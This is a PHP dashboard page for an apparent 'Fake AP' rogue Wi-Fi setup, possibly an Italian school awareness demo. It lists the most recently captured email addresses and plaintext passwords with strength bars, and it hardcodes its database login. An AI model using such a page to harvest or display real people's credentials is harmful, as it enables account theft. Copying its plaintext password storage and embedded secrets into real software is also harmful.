<!doctype html>
<html lang="it">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/style.css">

    <link rel="shortcut icon" href="img/favicon-2018.png">
    <title>Dashboard | Fake AP</title>
</head>
<body class="bg-dark">
<main class="container">
    <div class="row text-center justify-content-center mt-4">
        <img src="/www/img/JOBlogo11.png" alt="JOB Logo" height="95">
        <i class="fas fa-heart fa-4x text-danger mr-5 ml-5 pt-3"></i>
        <img src="/www/img/LogoITSAR2017.png" alt="ITS AR Logo" height="95">
    </div>
    <div class="row mt-5">
        <div class="card box-shadow border-0 pr-2 pl-2" style="width: 100%">
            <table class="table table-striped mt-2">
                <thead>
                <tr>
                    <th scope="col">E-Mail</th>
                    <th scope="col">Password</th>
                    <th scope="col">Robustezza Password</th>
                </tr>
                </thead>
                <tbody>
                <?php
                $servername = "localhost";
                $username = "zeus";
                $password = 'Pa$$w0rd';
                $db = "fake_ap";

                // Create connection
                $conn = new mysqli($servername, $username, $password, $db);
                $query = "SELECT * FROM credentials ORDER BY registration_date DESC LIMIT 15";
                $res = $conn->query($query);

                while ($row = $res->fetch_object()):
                ?>
                <tr>
                    <td><?= $row->email?></td>
                    <td><?= $row->password?></td>
                    <td>
                        <?php
                        $color = "";
                        $percentage= "";
                        switch ($row->score)
                        {
                            case 1:
                                $color = "bg-danger";
                                $percentage = "20";
                                break;
                            case 2:
                                $color = "bg-orange";
                                $percentage = "40";
                                break;
                            case 3:
                                $color = "bg-warning";
                                $percentage = "60";
                                break;
                            case 4:
                                $color = "bg-light-green";
                                $percentage = "80";
                                break;
                            case 5:
                                $color = "bg-success";
                                $percentage = "100";
                                break;
                            default:
                                $color = "bg-warning";
                                $percentage = "30";
                                break;
                        }

                        ?>
                        <div class="progress">
                            <div class="progress-bar <?= $color?>" role="progressbar" style="width: <?= $percentage?>%" aria-valuenow="<?= $percentage?>" aria-valuemin="0" aria-valuemax="100"></div>
                        </div>
                    </td>
                </tr>
                <?php
                endwhile;
                ?>
                </tbody>
            </table>
        </div>
    </div>
</main>

<script src="js/jquery-3.3.1.slim.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>

<script>
    setTimeout(function() {
        location.reload();
    }, 5000);
</script>
</body>
</html>